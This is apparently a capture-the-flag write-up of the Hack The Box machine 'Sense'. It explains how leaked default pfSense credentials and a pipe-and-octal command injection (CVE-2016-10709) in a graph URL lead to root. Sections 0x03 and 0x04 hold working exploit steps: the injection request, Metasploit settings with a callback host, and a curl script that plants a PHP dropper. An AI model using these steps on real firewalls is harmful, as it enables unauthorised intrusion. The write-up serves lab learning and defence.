---
layout: post
title: "The Firewall That Trusted a Pipe"
subtitle: "HTB Sense, where a leftover text file leaks the firewall's own login and a single pipe character in a graph URL hands you root"
date: 2018-03-31 12:00:00 +0000
description: "A pfSense firewall leaks its own login in a forgotten text file, then runs whatever you pipe into a graph URL, as root."
image: /assets/og/the-firewall-that-trusted-a-pipe.png
tags: [hackthebox, writeup]
---

Sense is a firewall, and the joke writes itself. The whole point of a firewall is to be the careful one, the device that reads everything coming through and decides what is allowed. This one leaves its own front-door credentials sitting in a text file you can read without logging in, and then, once you are inside, it runs whatever command you slip into the address of a status graph. Two ports, two mistakes, and a straight line to root. There is no kernel exploit here, no clever chain, no memory corruption. There is a guard who taped his password to the wall and a back office that treats a web request like a to-do list.

```
        S E N S E   ( pfSense )
        =======================
        443/tcp  →  the login wall
                    "who goes there?"
                        |
        /system-users.txt  ← left on the floor
                    rohit / pfsense
                        |
                        v
        status_rrd_graph_img.php?graph= ... | sh
        the graph URL had a pipe in it.
        the firewall did what came after the pipe.
                                            門
```

## 0x01 · two ports and a locked gate

`nmap` comes back almost insultingly short. Two web ports and nothing else.

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
```

Port 80 just bounces you to 443, so everything lives behind TLS. The page that loads is a pfSense login. pfSense is a firewall and router distribution built on FreeBSD, the kind of appliance that sits at the edge of a small network and decides what traffic gets to live. So the box is FreeBSD under the hood, which already tells you a few of your Linux reflexes will not fire here.

A login wall with no obvious version string and no other service is a dead end at first glance. When the front door will not open, you stop knocking and start reading the walls.

## 0x02 · the password taped to the wall

Directory brute forcing is the unglamorous part of every box and the part that wins this one. You point a wordlist at the server and ask, one path at a time, "does this exist." Most answers are no. A few are yes, and the yeses are the whole game.

```
# gobuster dir -u https://10.10.10.60 -k \
    -w directory-list-2.3-medium.txt -x php,txt,html
/changelog.txt        (Status: 200)
/system-users.txt     (Status: 200)
/index.php            (Status: 200)
```

Think of it like walking a long hallway and trying every doorknob. You are not picking locks. You are finding the doors somebody forgot to lock. Two text files answer with a 200, which on a firewall login portal is already strange, because a clean appliance has no business serving loose `.txt` files to the public.

`system-users.txt` is the gift. It reads like a hurried support note left behind during setup.

```
# Company defaults
username: Rohit
password: the default password is the company default
```

The note does not print the password. It tells you the password is "the company default," which for pfSense is the word `pfsense`. So you try the obvious pair, `rohit` / `pfsense`, against the login, and you are in. A default credential is not really a password at all. It is a placeholder somebody promised to change and never did, and a firewall is the single worst place on the network to forget that promise.

## 0x03 · the pipe the firewall trusted

Inside, this is pfSense 2.1.3, and that version carries CVE-2016-10709, a command injection in a page almost nobody thinks about. The pfSense web interface draws pretty bandwidth and CPU graphs, and one of the scripts that renders them is `status_rrd_graph_img.php`. It takes a `graph` parameter that is supposed to name which graph you want, and then it hands that name off to the operating system to do the actual drawing.

Here is the flaw in plain terms. The developers knew the `graph` value would be passed toward a shell, so they wrote a regular expression filter to strip dangerous characters out of it. They missed one. They never removed the pipe character, the `|`. In a shell, a pipe means "take the output of the thing on the left and feed it into the thing on the right," and more usefully for an attacker, it lets you tack a second command onto the end of a legitimate one. The filter cleaned the room and left the window open.

Picture a mail room with a strict rule. Every package label gets scanned for forbidden words before anything ships. The scanner catches "bomb" and "weapon" and a dozen others, but nobody told it that a semicolon or a pipe means "and also do this next thing." So you write a perfectly innocent label, add a pipe, and write a second instruction after it. The scanner sees clean words and waves it through. The shipping clerk reads the whole line and obeys both halves.

There is a second wrinkle. The filter does block some characters outright, including the dash that command flags need. The bypass is octal encoding. You never type the forbidden character directly. You ask `printf` to produce it from its numeric code. The dash, ASCII 45, is octal `55`, and `printf "\55"` prints a dash. So you build your entire payload out of `printf` calls that reconstruct the blocked characters at runtime, on the far side of the filter, where nothing is checking anymore.

Think of it like a bouncer with a banned-words list who checks what you say at the door but not what you spell out once you are inside. You walk in saying only allowed words, then quietly spell the banned one letter by letter to the bartender. The check happened too early to matter.

Stitched together, the request looks roughly like this. A real graph name to keep the page happy, a pipe, and then a `printf` payload that writes an attacker file and pipes the whole thing into `sh`.

```
GET /status_rrd_graph_img.php?database=queues&graph=
    custom-tmpfile|printf '\57usr\57...'|sh|echo HTTP/1.1
```

The cleanest way to fire it without hand-rolling every octal byte is the Metasploit module written for exactly this CVE. You give it the leaked credentials and an attacker host to call back to.

```
msf6 > use exploit/unix/http/pfsense_graph_injection_exec
msf6 > set RHOSTS 10.10.10.60
msf6 > set USERNAME rohit
msf6 > set PASSWORD pfsense
msf6 > set LHOST 10.10.14.4
msf6 > run
```

Under the hood it logs in as rohit, posts a `graph` parameter whose pipe-and-printf tail writes a small PHP stager named `iceberg.php` into the web root, then requests that file to pull down and run a [ reverse shell calling back to 10.10.14.4 on 443 ]. The login was rohit, a deliberately un-privileged user. The shell that comes back is not.

```
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# cat /home/rohit/user.txt
████████████████████████████████
# cat /root/root.txt
████████████████████████████████
```

Read that `uid=0` and notice what did not happen. There was no privilege escalation step. The graph-drawing script runs as root, because the pfSense web stack runs as root, so the moment your command lands it lands wearing the crown. The injection was the whole climb.

## 0x04 · doing it by hand, for the muscle memory

Metasploit makes this a four-line affair, which is great for a demo and terrible for learning. The payload is worth understanding by hand, because the shape of it shows up everywhere.

The manual version is a `curl` to the same endpoint with a `graph` value built in two halves. The first half is a legitimate-looking filename so the regex is satisfied. After the unfiltered pipe, you assemble a command entirely out of `printf` octal sequences, because the literal characters you need are on the blocklist. That reconstructed command writes a tiny PHP file to a path the web server will serve, and a second request to that PHP file triggers the actual callback.

```
# encode the dropper as octal so the filter sees nothing it hates
payload=$(python3 -c 'print("".join("\\%o"%b for b in open("drop.php","rb").read()))')
# legitimate name, then pipe, then printf the payload into a file, then sh
graph="domain|printf '$payload' > /usr/local/www/iceberg.php|sh|echo"
curl -sk -b "$cookie" \
  "https://10.10.10.60/status_rrd_graph_img.php?database=queues&graph=$graph"
# now just visit the file you planted
curl -sk "https://10.10.10.60/iceberg.php"
```

The dropper itself is the usual `<?php [ one-line webshell: run the cmd request parameter ] ?>`, and I am describing it rather than printing it on purpose. A literal one-line PHP webshell is short, famous, and instantly quarantined as malware the second it touches disk, which is the funniest possible proof of how dangerous four words can be. Picture it, do not paste it.

## 0x05 · the honest caveat

It is easy to look at Sense and see a museum piece. pfSense 2.1.3 is ancient, CVE-2016-10709 is patched, and nobody is shipping this version in 2026. All true, and all beside the point, because neither mistake on this box is really about pfSense.

The first mistake is a secret left where strangers can read it. A setup note with the default login, served as a plain text file from a public web root, is the same error whether it lands in 2018 or next Tuesday. Defaults exist to be changed, and notes about defaults exist to be deleted. A firewall that leaks its own password is not a firewall, it is a door with a label that says where the key is hidden.

The second mistake is the one that should keep people up at night, because it is so seductive. The pfSense developers did the responsible-looking thing. They saw user input heading toward a shell and they wrote a filter. They just wrote a filter that enumerated badness, a list of characters to remove, and forgot one. That is the whole trap of blocklists. You have to think of every dangerous character, every encoding, every octal escape and every clever substitution, and the attacker only has to find the single thing you missed. The pipe got through, and once one character gets through, the filter is decoration. The fix was never a longer blocklist. It was to never build the shell command out of user input in the first place, to treat that `graph` value as an inert label and nothing more.

Both bugs are the same confession in different rooms. Somewhere, something a stranger could control got treated as more trustworthy than it was. A text file that should have been deleted got read. A parameter that should have been a name got run.

## 0x06 · outro

```
the firewall left its own password on the floor.
you read it, walked in, and asked for a graph.
the graph URL had a pipe in it, and the firewall
        obeyed the part that came after the pipe.

no privesc. the drawing script was already root.
one missed character on a blocklist, and the wall fell.

read the floor. distrust the input. wear black.

                                                            EOF
```

---

*HTB: Sense, retired 24 Mar 2018. An easy FreeBSD box that is really a lecture on two things a firewall should never do: leak its own login, and run what you pipe into it. The pipe still works in a lab and nowhere you don't own.*